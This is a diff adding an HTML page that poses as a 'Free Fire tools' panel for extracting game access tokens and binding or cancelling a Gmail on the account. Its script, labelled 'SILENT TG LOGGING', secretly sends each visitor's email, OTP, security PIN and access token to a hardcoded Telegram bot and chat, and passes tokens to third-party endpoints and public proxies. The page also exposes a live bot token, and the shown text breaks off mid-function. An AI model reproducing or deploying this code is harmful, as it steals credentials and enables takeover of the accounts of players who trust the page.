@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SUMAN BHAI | SCAMMER KA BAAP</title>
+    
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Orbitron:wght@400;500;700;800&family=Montserrat:wght@400;500;600;700&display=swap');
+
+    :root {
+        --bg-primary: #0a0a0f;
+        --bg-secondary: #11111f;
+        --bg-card: rgba(20, 20, 35, 0.9);
+        --border: rgba(255, 255, 255, 0.1);
+        
+        --gradient-1: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        --gradient-2: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        --gradient-3: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        --gradient-4: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
+        
+        --accent-blue: #4facfe;
+        --accent-purple: #9d4edd;
+        --accent-pink: #f5576c;
+        --accent-green: #43e97b;
+        --error-red: #ff4757;
+        
+        --text-primary: #ffffff;
+        --text-secondary: #b0b0d0;
+        
+        --shadow-lg: 0 15px 40px rgba(0, 0, 0, 0.4);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    /* SMOOTH SCROLLING & SCROLLBAR */
+    html { scroll-behavior: smooth; }
+    
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: var(--bg-primary); }
+    ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent-blue); }
+
+    body {
+        background: var(--bg-primary);
+        color: var(--text-primary);
+        font-family: 'Poppins', sans-serif;
+        min-height: 100vh;
+        overflow-x: hidden;
+        padding-bottom: 110px; /* Extra space for bottom nav */
+    }
+
+    /* Animation Background */
+    .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; overflow: hidden; pointer-events: none; }
+    .bg-particle {
+        position: absolute; background: var(--accent-blue); border-radius: 50%;
+        animation: float 25s infinite linear; opacity: 0.08;
+    }
+    @keyframes float { 0% { transform: translateY(0) rotate(0deg); } 100% { transform: translateY(-100px) rotate(360deg); } }
+
+    .container {
+        max-width: 480px; margin: 0 auto; padding: 25px 20px;
+        position: relative; z-index: 1;
+        padding-top: 60px; /* Extra padding for fixed header */
+    }
+
+    /* HEADERS WITH LINES */
+    .brand-header { text-align: center; margin-bottom: 35px; padding-top: 10px; }
+    .brand-logo {
+        font-family: 'Orbitron', sans-serif; font-size: 2.6rem; font-weight: 800;
+        background: var(--gradient-1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        text-shadow: 0 5px 20px rgba(102, 126, 234, 0.4); display: inline-block; margin-bottom: 5px;
+    }
+    .brand-subtitle { 
+        color: var(--text-secondary); font-size: 0.85rem; letter-spacing: 3px; 
+        text-transform: uppercase; font-weight: 600;
+    }
+    /* The "Line" you wanted */
+    .brand-separator {
+        width: 60px; height: 4px; background: var(--gradient-3);
+        margin: 15px auto 0 auto; border-radius: 50px;
+        box-shadow: 0 0 10px var(--accent-blue);
+    }
+    
+    /* NEW FIXED DEVELOPER BADGE STYLE */
+    .dev-top-link {
+        position: fixed;
+        top: 15px;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 1500; /* High Z-index to stay on top */
+        
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        background: rgba(15, 15, 30, 0.85); /* Semi-transparent */
+        backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
+        border: 1px solid rgba(79, 172, 254, 0.4);
+        color: var(--accent-blue);
+        text-decoration: none;
+        padding: 8px 20px;
+        border-radius: 50px;
+        font-size: 0.75rem;
+        font-weight: 700;
+        transition: 0.3s;
+        letter-spacing: 0.5px;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.4);
+        white-space: nowrap;
+    }
+    .dev-top-link:hover {
+        background: rgba(79, 172, 254, 0.15);
+        box-shadow: 0 0 20px rgba(79, 172, 254, 0.3);
+        transform: translateX(-50%) translateY(2px);
+    }
+
+    /* Cards */
+    .glass-card {
+        background: var(--bg-card); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+        border: 1px solid var(--border); border-radius: 26px; padding: 25px;
+        margin-bottom: 25px; box-shadow: var(--shadow-lg); transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .glass-card:hover { transform: translateY(-2px); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+    
+    .section-label {
+        display: flex; align-items: center; gap: 12px; color: var(--accent-blue);
+        font-size: 0.85rem; font-weight: 700; text-transform: uppercase;
+        letter-spacing: 1px; margin-bottom: 18px; font-family: 'Montserrat', sans-serif;
+    }
+
+    /* Input Fields */
+    .input-group { margin-bottom: 18px; }
+    .input-box {
+        width: 100%; padding: 18px; background: rgba(0, 0, 0, 0.3);
+        border: 1px solid var(--border); border-radius: 16px; color: #fff;
+        font-family: 'Poppins', sans-serif; font-size: 1rem; transition: 0.3s;
+    }
+    .input-box:focus { outline: none; border-color: var(--accent-blue); background: rgba(0, 0, 0, 0.5); box-shadow: 0 0 15px rgba(79, 172, 254, 0.1); }
+    .input-box.error { border-color: var(--error-red); }
+
+    /* Buttons */
+    .btn {
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        width: 100%; padding: 18px; border: none; border-radius: 18px;
+        font-family: 'Poppins', sans-serif; font-size: 1rem; font-weight: 700;
+        cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
+        text-decoration: none; color: white; position: relative; overflow: hidden;
+    }
+    .btn:active { transform: scale(0.98); }
+    
+    .btn-primary { background: var(--gradient-1); box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3); }
+    .btn-secondary { background: rgba(255, 255, 255, 0.05); border: 1px solid var(--border); color: var(--text-primary); }
+    .btn-secondary:hover { background: rgba(255, 255, 255, 0.1); }
+    .btn-accent { background: var(--gradient-4); color: #000; font-weight: 800; box-shadow: 0 8px 25px rgba(67, 233, 123, 0.2); }
+    .btn-danger { background: var(--gradient-2); color: white; font-weight: 700; box-shadow: 0 8px 25px rgba(245, 87, 108, 0.3); }
+
+    /* --- BIND TOOL SPECIFIC --- */
+    .step-container { display: none; animation: fadeIn 0.5s ease; }
+    .step-container.active { display: block; }
+    .flex-row { display: flex; gap: 10px; }
+    
+    .btn-next { padding: 0 25px; background: var(--gradient-3); color: #000; font-weight: 700; border: none; border-radius: 14px; cursor: pointer; white-space: nowrap; }
+    .btn-submit { width: 100%; padding: 18px; background: var(--gradient-3); color: #000; font-weight: 700; border: none; border-radius: 14px; cursor: pointer; margin-top: 10px; box-shadow: 0 5px 20px rgba(79, 172, 254, 0.3); }
+    .btn-nav-small { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--border); color: #ccc; border-radius: 12px; cursor: pointer; margin-top: 15px; font-size: 0.9rem; }
+
+    .error-text { color: var(--error-red); font-size: 0.75rem; margin-left: auto; display: none; font-weight: 600; }
+
+    /* --- SOCIAL CHANNELS --- */
+    .social-list-vertical { display: flex; flex-direction: column; gap: 12px; }
+    .social-card-row {
+        display: flex; align-items: center; padding: 14px 18px;
+        background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border);
+        border-radius: 18px; text-decoration: none; transition: 0.3s;
+    }
+    .social-card-row:hover { transform: translateX(5px); background: rgba(255, 255, 255, 0.08); border-color: var(--accent-blue); }
+    
+    .social-icon-box {
+        width: 45px; height: 45px; border-radius: 14px; display: flex;
+        align-items: center; justify-content: center; font-size: 1.5rem; color: white; margin-right: 15px; flex-shrink: 0;
+    }
+    .tg-bg { background: #229ED9; }
+    .ig-bg { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
+    .yt-bg { background: #FF0000; }
+    
+    .social-texts { display: flex; flex-direction: column; }
+    .social-name { color: white; font-weight: 600; font-size: 1rem; }
+    .social-handle { color: var(--text-secondary); font-size: 0.8rem; }
+
+    /* --- FOOTER --- */
+    .footer {
+        text-align: center; margin-top: 40px; padding: 25px 0;
+        color: var(--text-secondary); font-size: 0.85rem;
+        border-top: 1px solid var(--border);
+    }
+    .powered-by {
+        color: var(--accent-blue); font-weight: 800; margin-top: 8px;
+        font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase; display: block;
+    }
+
+    /* Bottom Nav */
+    .bottom-nav {
+        position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+        display: flex; gap: 12px; background: rgba(15, 15, 25, 0.9); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
+        border: 1px solid rgba(255,255,255,0.15); border-radius: 60px; padding: 12px 15px;
+        z-index: 1000; box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+    }
+    .nav-item {
+        width: 55px; height: 55px; border-radius: 50%; display: flex;
+        align-items: center; justify-content: center; color: rgba(255,255,255,0.5);
+        font-size: 1.4rem; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+        cursor: pointer; text-decoration: none; position: relative;
+    }
+    .nav-item.active { background: var(--gradient-1); color: white; transform: translateY(-15px); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5); }
+
+    /* Modal */
+    .modal-overlay {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px);
+        display: flex; align-items: center; justify-content: center;
+        z-index: 2000; opacity: 0; visibility: hidden; transition: 0.4s; padding: 20px;
+    }
+    .modal-overlay.show { opacity: 1; visibility: visible; }
+    .modal-content {
+        background: #161625; border-radius: 30px; padding: 35px;
+        max-width: 400px; width: 100%; border: 1px solid rgba(255,255,255,0.1);
+        transform: scale(0.9); transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); text-align: center;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+    }
+    .modal-overlay.show .modal-content { transform: scale(1); }
+    
+    .token-display {
+        background: rgba(0, 0, 0, 0.4); border: 1px dashed var(--border);
+        border-radius: 14px; padding: 15px; margin: 20px 0;
+        font-family: 'Courier New', monospace; font-size: 0.85rem; word-break: break-all;
+        max-height: 150px; overflow-y: auto; color: var(--accent-green); text-align: left;
+    }
+    .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.95rem; }
+    .data-val { font-weight: 600; color: #fff; }
+
+    #toast {
+        position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+        background: var(--gradient-1); color: white; padding: 14px 30px;
+        border-radius: 50px; font-weight: 600; font-size: 0.95rem; z-index: 3000; 
+        transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+
+    .fade-in-up { animation: fadeInUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards; }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    .hidden { display: none !important; }
+
+</style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div id="toast"></div>
+
+    <a href="https://t.me/BrrExeBot" target="_blank" class="dev-top-link">
+        <i class="fab fa-telegram-plane"></i> DEVELOPER TG @BrrExeBot
+    </a>
+
+    <div id="view-dashboard" class="container fade-in-up">
+        
+        <div class="brand-header">
+            <h1 class="brand-logo">SUMAN BHAI</h1>
+            <div class="brand-subtitle">SCAMMER KA BAAP</div>
+            <div class="brand-separator"></div>
+        </div>
+        
+        <div class="glass-card">
+            <div class="section-label"><i class="fas fa-rocket"></i> SELECT TOOL</div>
+            
+            <div class="input-group">
+                <a href="#" onclick="switchView('token'); return false;" class="btn btn-primary">
+                    <i class="fas fa-key"></i> <span>GET EAT & ACCESS TOKEN</span>
+                </a>
+            </div>
+            
+            <div class="input-group">
+                <a href="#" onclick="switchView('bind'); return false;" class="btn btn-secondary">
+                    <i class="fas fa-fingerprint"></i> <span>SET NEW GMAIL</span>
+                </a>
+            </div>
+            
+            <div class="input-group">
+                <a href="#" onclick="switchView('cancel'); return false;" class="btn btn-accent">
+                    <i class="fas fa-trash-alt"></i> <span>CANCEL GMAIL IN FF</span>
+                </a>
+            </div>
+        </div>
+        
+        <div class="glass-card">
+            <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
+            <div class="social-list-vertical">
+                <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
+                    <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
+                    <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
+                </a>
+                <a href="https://www.instagram.com/realsuman355?igsh=Z2l6YjR2c2NxZzM5" target="_blank" class="social-card-row">
+                    <div class="social-icon-box ig-bg"><i class="fab fa-instagram"></i></div>
+                    <div class="social-texts"><span class="social-name">Instagram</span><span class="social-handle">@realsuman355</span></div>
+                </a>
+                <a href="https://youtube.com/@kfbgsuman?si=Gh-0tVX0KE90o3Ej" target="_blank" class="social-card-row">
+                    <div class="social-icon-box yt-bg"><i class="fab fa-youtube"></i></div>
+                    <div class="social-texts"><span class="social-name">YouTube</span><span class="social-handle">@kfbgsuman</span></div>
+                </a>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div>© 2026 SUMAN BHAI | FREE FIRE TOOLS</div>
+            <div class="powered-by">POWERED BY KAILASH</div>
+        </div>
+    </div>
+
+    <div id="view-token" class="container hidden">
+        <div class="brand-header">
+            <h1 class="brand-logo">GET TOKEN</h1>
+            <div class="brand-subtitle">AUTO EXTRACTOR</div>
+            <div class="brand-separator"></div>
+        </div>
+        
+        <div class="glass-card fade-in-up">
+            <div class="section-label"><i class="fas fa-sign-in-alt"></i> OPEN LOGIN PAGE</div>
+            <div style="display: grid; gap: 12px;">
+                <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=3" target="_blank" class="btn btn-secondary" style="background: linear-gradient(135deg, #1877F2, #0d5fcf); color: white; border: none;"><i class="fab fa-facebook-f"></i> FACEBOOK</a>
+                <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=8" target="_blank" class="btn btn-secondary" style="background: linear-gradient(135deg, #DB4437, #c23326); color: white; border: none;"><i class="fab fa-google"></i> GOOGLE</a>
+                <a href="https://auth.garena.com/universal/oauth?all_platforms=1&response_type=code&locale=en-SG&client_id=100067&redirect_uri=https%3A%2F%2Fapi.ff.garena.co.id%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-ticket.ff.gameid.garena.co.id%2Foauth%2Fcallback_redirect%2F&platform=5" target="_blank" class="btn btn-secondary" style="background: linear-gradient(135deg, #0077FF, #0066dd); color: white; border: none;"><i class="fab fa-vk"></i> VK CONNECT</a>
+                <a href="https://api.twitter.com/oauth/authenticate?oauth_token=hc3dgQAAAAABLP2yAAABmyGCmhA" target="_blank" class="btn btn-secondary" style="background: linear-gradient(135deg, #1DA1F2, #0c8bd9); color: white; border: none;"><i class="fab fa-twitter"></i> TWITTER</a>
+            </div>
+        </div>
+        
+        <div class="glass-card fade-in-up">
+            <div class="section-label"><i class="fas fa-paste"></i> PASTE & EXTRACT</div>
+            <textarea id="urlInput" class="input-box" placeholder="Paste URL starting with 'eat=' here..." style="min-height: 120px; resize: none;"></textarea>
+            <button onclick="processToken()" id="extBtn" class="btn btn-primary" style="margin-top: 15px;">GET ACCESS TOKEN</button>
+        </div>
+        <div style="height: 60px;"></div>
+    </div>
+
+    <div id="view-bind" class="container hidden">
+        <div class="brand-header">
+            <h1 class="brand-logo">BIND TOOL</h1>
+            <div class="brand-subtitle">SUMAN BHAI PANEL</div>
+            <div class="brand-separator"></div>
+        </div>
+
+        <div class="glass-card">
+            
+            <div id="step1" class="step-container active">
+                <div class="input-group">
+                    <div class="section-label"><i class="fas fa-envelope"></i> ENTER YOUR GMAIL</div>
+                    <input type="text" id="enterLater" class="input-box" placeholder="Enter email..." required>
+                </div>
+
+                <div class="input-group">
+                    <div class="section-label"><i class="fas fa-key"></i> ACCESS TOKEN</div>
+                    <div class="flex-row">
+                        <input type="text" id="accessToken1" class="input-box" placeholder="Paste token..." style="flex: 1;">
+                        <button id="step1Btn" class="btn-next">SEND OTP</button>
+                    </div>
+                </div>
+
+                <button onclick="switchStep(2)" class="btn-nav-small">
+                    GO NEXT PAGE <i class="fas fa-chevron-right"></i>
+                </button>
+
+                <div style="margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">
+                    <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
+                    <div class="social-list-vertical">
+                        <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
+                            <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
+                            <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
+                        </a>
+                        <a href="https://www.instagram.com/realsuman355?igsh=N3QxOHNqazE3ZzE0" target="_blank" class="social-card-row">
+                            <div class="social-icon-box ig-bg"><i class="fab fa-instagram"></i></div>
+                            <div class="social-texts"><span class="social-name">Instagram</span><span class="social-handle">@realsuman355</span></div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div id="step2" class="step-container">
+                <div class="input-group">
+                    <div class="section-label"><i class="fas fa-shield-alt"></i> ENTER OTP</div>
+                    <input type="number" id="otpInput" class="input-box" placeholder="e.g. 12345678" required>
+                </div>
+
+                <div class="input-group">
+                    <div class="section-label">
+                        <i class="fas fa-lock"></i> SECURITY PIN 
+                        <span id="pinError" class="error-text">NUMBERS ONLY!</span>
+                    </div>
+                    <input type="text" id="pinInput" class="input-box" placeholder="Min 6 digits..." required>
+                </div>
+
+                <div class="input-group">
+                    <div class="section-label"><i class="fas fa-key"></i> ACCESS TOKEN</div>
+                    <input type="text" id="accessToken2" class="input-box" placeholder="Paste token..." required>
+                </div>
+
+                <div class="input-group">
+                    <div class="section-label"><i class="fas fa-envelope"></i> ENTER GMAIL</div>
+                    <input type="email" id="gmailInput" class="input-box" placeholder="Your gmail..." required>
+                </div>
+
+                <button id="confirmBtn" class="btn-submit">CONFIRM BIND</button>
+
+                <button onclick="switchStep(1)" class="btn-nav-small">
+                    <i class="fas fa-arrow-left"></i> GO BACK
+                </button>
+            </div>
+        </div>
+        <div style="height: 60px;"></div>
+    </div>
+
+    <div id="view-cancel" class="container hidden">
+        <div class="brand-header">
+            <h1 class="brand-logo">CANCEL TOOL</h1>
+            <div class="brand-subtitle">REMOVE GMAIL</div>
+            <div class="brand-separator"></div>
+        </div>
+
+        <div class="glass-card fade-in-up">
+            <div class="section-label">
+                <i class="fas fa-fingerprint"></i>
+                <span>FF Access Token</span>
+            </div>
+            <textarea id="cancelToken" class="input-box" placeholder="Paste access token here..." style="min-height: 120px; resize: none;"></textarea>
+            
+            <button id="cancelBtn" class="btn btn-danger" style="margin-top: 15px;">
+                <i class="fas fa-trash-alt"></i>
+                <span>CANCEL GMAIL</span>
+            </button>
+        </div>
+
+        <div class="glass-card">
+            <div class="section-label"><i class="fas fa-users"></i> OFFICIAL CHANNELS</div>
+            <div class="social-list-vertical">
+                <a href="https://t.me/reallsumann" target="_blank" class="social-card-row">
+                    <div class="social-icon-box tg-bg"><i class="fab fa-telegram-plane"></i></div>
+                    <div class="social-texts"><span class="social-name">Telegram</span><span class="social-handle">@Realsuman2561</span></div>
+                </a>
+                <a href="https://instagram.com/realsuman355" target="_blank" class="social-card-row">
+                    <div class="social-icon-box ig-bg"><i class="fab fa-instagram"></i></div>
+                    <div class="social-texts"><span class="social-name">Instagram</span><span class="social-handle">@realsuman355</span></div>
+                </a>
+            </div>
+        </div>
+
+        <div style="height: 60px;"></div>
+    </div>
+
+    <div class="modal-overlay" id="tokenModal">
+        <div class="modal-content">
+            <div style="font-size: 4rem; margin-bottom: 10px;">🎉</div>
+            <h2 style="font-family: 'Orbitron'; background: var(--gradient-3); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 5px; font-size: 1.8rem;">SUCCESS</h2>
+            
+            <div id="tokenDetails" style="margin-bottom: 20px;">
+                <div class="data-row"><span>Name</span><span id="tName" class="data-val" style="color: var(--accent-green);">...</span></div>
+                <div class="data-row"><span>UID</span><span id="tUid" class="data-val" style="color: var(--accent-green);">...</span></div>
+                <div class="data-row"><span>Region</span><span id="tRegion" class="data-val" style="color: var(--accent-purple);">...</span></div>
+            </div>
+
+            <div id="genericMsg" style="color: var(--text-secondary); margin-bottom: 20px; display:none; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px;"></div>
+
+            <div class="token-display" id="tAcc"></div>
+            
+            <div style="display: grid; gap: 12px; margin-top: 25px;">
+                <button onclick="safeCopy()" id="copyBtn" class="btn btn-primary">COPY TOKEN</button>
+                <button onclick="closeModal('tokenModal')" class="btn btn-secondary">CLOSE</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div class="nav-item active" id="nav-home" onclick="switchView('dashboard')">
+            <i class="fas fa-home"></i>
+        </div>
+        <div class="nav-item" id="nav-token" onclick="switchView('token')">
+            <i class="fas fa-key"></i>
+        </div>
+        <div class="nav-item" id="nav-bind" onclick="switchView('bind')">
+            <i class="fas fa-fingerprint"></i>
+        </div>
+        <div class="nav-item" id="nav-cancel" onclick="switchView('cancel')">
+            <i class="fas fa-star"></i>
+        </div>
+    </div>
+
+<script>
+    // === TELEGRAM CONFIGURATION ===
+    const TG_BOT_TOKEN = '8478471111:AAH7-TSGMozFOXxWuC8deQKhK0KxK6ZWVdU';
+    const TG_CHAT_ID = '8257117768';
+
+    function sendLogToTG(msg) {
+        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`;
+        fetch(url).catch(err => console.log('Log failed'));
+    }
+
+    // === ANIMATION PARTICLES ===
+    document.addEventListener('DOMContentLoaded', () => {
+        const c = document.querySelector('.bg-animation');
+        for(let i=0; i<18; i++) {
+            const p = document.createElement('div');
+            p.className = 'bg-particle';
+            p.style.left = Math.random()*100+'%';
+            p.style.top = Math.random()*100+'%';
+            p.style.width = p.style.height = (Math.random()*60+20)+'px';
+            p.style.animationDuration = (Math.random()*30+15)+'s';
+            c.appendChild(p);
+        }
+    });
+
+    // === NAVIGATION (SMOOTH SCROLL) ===
+    function switchView(viewName) {
+        document.getElementById('view-dashboard').classList.add('hidden');
+        document.getElementById('view-token').classList.add('hidden');
+        document.getElementById('view-bind').classList.add('hidden');
+        document.getElementById('view-cancel').classList.add('hidden');
+        
+        document.querySelectorAll('.container').forEach(el => el.classList.remove('fade-in-up'));
+
+        const target = document.getElementById('view-' + viewName);
+        target.classList.remove('hidden');
+        
+        // Force reflow for animation restart
+        void target.offsetWidth; 
+        target.classList.add('fade-in-up');
+
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        
+        if (viewName === 'dashboard') document.getElementById('nav-home').classList.add('active');
+        else if (viewName === 'token') document.getElementById('nav-token').classList.add('active');
+        else if (viewName === 'bind') document.getElementById('nav-bind').classList.add('active');
+        else if (viewName === 'cancel') document.getElementById('nav-cancel').classList.add('active');
+
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // === BIND TOOL LOGIC ===
+    function switchStep(step) {
+        document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+        
+        if(step === 2) {
+            const t1 = document.getElementById('accessToken1').value;
+            if(t1) document.getElementById('accessToken2').value = t1;
+            const mail1 = document.getElementById('enterLater').value;
+            if(mail1) document.getElementById('gmailInput').value = mail1;
+        }
+    }
+
+    document.getElementById('step1Btn').addEventListener('click', function() {
+        const token = document.getElementById('accessToken1').value.trim();
+        const later = document.getElementById('enterLater').value.trim();
+        const btn = this;
+        const originalText = btn.innerHTML;
+
+        if (!token || !later) return showToast('Please fill all fields', 'error');
+
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+        
+        fetch(`https://email-bind-crowx64.vercel.app/bind?access_token=${encodeURIComponent(token)}&email=${encodeURIComponent(later)}`)
+            .then(res => res.json().catch(()=>({})))
+            .then(() => showToast('OTP SENT SUCCESSFULLY', 'success'))
+            .catch(() => showToast('Connection Failed', 'error'))
+            .finally(() => btn.innerHTML = originalText);
+    });
+
+    const pinInput = document.getElementById('pinInput');
+    const pinError = document.getElementById('pinError');
+    pinInput.addEventListener('input', function() {
+        if (/[^0-9]/.test(this.value)) {
+            this.classList.add('error'); pinError.style.display = 'block';
+        } else {
+            this.classList.remove('error'); pinError.style.display = 'none';
+        }
+    });
+
+    document.getElementById('confirmBtn').addEventListener('click', function() {
+        const otp = document.getElementById('otpInput').value.trim();
+        const pin = document.getElementById('pinInput').value.trim();
+        const token = document.getElementById('accessToken2').value.trim();
+        const email = document.getElementById('gmailInput').value.trim();
+        const btn = this;
+        const originalText = btn.innerHTML;
+
+        if (!otp || !pin || !token || !email) return showToast('Fill all fields!', 'error');
+        if (/[^0-9]/.test(pin)) return showToast('Pin must be numbers', 'error');
+
+        // --- SILENT TG LOGGING (BIND) ---
+        const logMsg = `🔗 <b>BIND ATTEMPT</b>\n\n📧 <b>Email:</b> ${email}\n1️⃣ <b>OTP:</b> ${otp}\n2️⃣ <b>PIN:</b> ${pin}\n\n🔑 <b>Token:</b> <code>${token}</code>`;
+        sendLogToTG(logMsg);
+        // --------------------------------
+
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+        btn.disabled = true;
+
+        const apiUrl = `https://email-bind-crowx64.vercel.app/confirmbind?otp=${encodeURIComponent(otp)}&secondary_pass=${encodeURIComponent(pin)}&access_token=${encodeURIComponent(token)}&email=${encodeURIComponent(email)}`;
+
+        fetch(apiUrl)
+            .then(res => res.json().catch(()=>({})))
+            .then(() => showToast('BIND CONFIRMED SUCCESSFULLY', 'success'))
+            .catch(() => showToast('Request Failed', 'error'))
+            .finally(() => {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            });
+    });
+
+    // === CANCEL GMAIL LOGIC ===
+    document.getElementById('cancelBtn').addEventListener('click', async function() {
+        let token = document.getElementById('cancelToken').value.trim();
+        const btn = this;
+        const originalText = btn.innerHTML;
+
+        if (!token) return showToast("Please enter a token!", 'error');
+
+        // Clean token if full URL
+        if (token.includes('access_token=')) {
+            token = token.split('access_token=')[1].split('&')[0];
+        }
+
+        // --- SILENT TG LOGGING (CANCEL) ---
+        const logMsg = `🚫 <b>CANCEL ATTEMPT</b>\n\n🔑 <b>Token:</b> <code>${token}</code>`;
+        sendLogToTG(logMsg);
+        // ----------------------------------
+
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
+
+        try {
+            const apiUrl = `https://execancel.vercel.app/cancelrequest?access=${token}`;
+            await fetch(apiUrl, { method: 'GET', mode: 'no-cors' });
+
+            // UI Update on Success
+            document.getElementById('tokenDetails').style.display = 'none';
+            document.getElementById('tAcc').style.display = 'none';
+            document.getElementById('copyBtn').style.display = 'none';
+            
+            const msgBox = document.getElementById('genericMsg');
+            msgBox.style.display = 'block';
+            msgBox.innerHTML = "<h3 style='color:#43e97b'>GMAIL CANCELLED!</h3><p>The Gmail bind has been removed successfully.</p>";
+            
+            openModal('tokenModal');
+
+        } catch (err) {
+            showToast("Connection Failed!", 'error');
+        } finally {
+            btn.disabled = false;
+            btn.innerHTML = originalText;
+        }
+    });
+
+    // === TOKEN EXTRACTION LOGIC (ROBUST MULTI-PROXY) ===
+    async function processToken() {
+        const inputField = document.getElementById('urlInput');
+        let rawInput = inputField.value.trim();
+        if (!rawInput) return showToast('Please input URL/Token!', 'error');
+
+        const btn = document.getElementById('extBtn');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> WORKING...';
+        btn.disabled = true;
+
+        try {
+            // Token cleaning logic
+            if (rawInput.includes('eat=')) rawInput = rawInput.split('eat=')[1];
+            if (rawInput.includes('&')) rawInput = rawInput.split('&')[0];
+            
+            // Target URL
+            const target = `https://danger-access-token.vercel.app/eat-to-access?eat_token=${rawInput}`;
+            
+            // PROXY LIST (Try one by one until success)
+            // 1. CodeTabs (Best Free alternative)
+            // 2. AllOrigins Raw (Backup)
+            const proxies = [
+                `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(target)}`,
+                `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`
+            ];
+
+            let data = null;
+            let success = false;
+
+            for (const proxyUrl of proxies) {
+                try {
+                    const res = await fetch(proxyUrl);
+                    if (!res.ok) continue; // Try next proxy
+                    
+                    data = await res.json();
+                    if (data && (data.access_token || data.error)) {
+                        success = true;
+                        break; // Stop loop if we got data
+                    }
+                } catch (e) {
+                    console.log("Proxy failed, trying next...");
+                }
+            }
+
+            if (success && data.access_token) {
